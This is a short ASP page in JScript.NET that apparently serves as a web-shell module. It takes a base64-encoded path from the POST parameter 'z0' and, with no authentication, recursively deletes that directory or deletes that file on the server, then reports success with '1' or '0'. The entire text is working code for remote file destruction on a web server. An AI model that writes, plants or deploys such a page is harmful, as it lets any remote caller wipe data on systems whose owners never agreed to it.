<%

function base64Decode(str) {
    if (str == null || str == "")
        return "";

    var bytes : System.Byte[] = System.Convert.FromBase64String(str);
    return System.Text.Encoding.UTF8.GetString(bytes);
}

var szEntry = base64Decode(Request.Form("z0"));

try {
    if (System.IO.Directory.Exists(szEntry)) {
        System.IO.Directory.Delete(szEntry, true); 
        Response.Write("1");
    } 
    else if (System.IO.File.Exists(szEntry)) {
        System.IO.File.Delete(szEntry);
        Response.Write("1");
    } 
    else {
        Response.Write("0");
    }
}
catch (ex : System.Exception) {
    Response.Write("0"); 
}

%>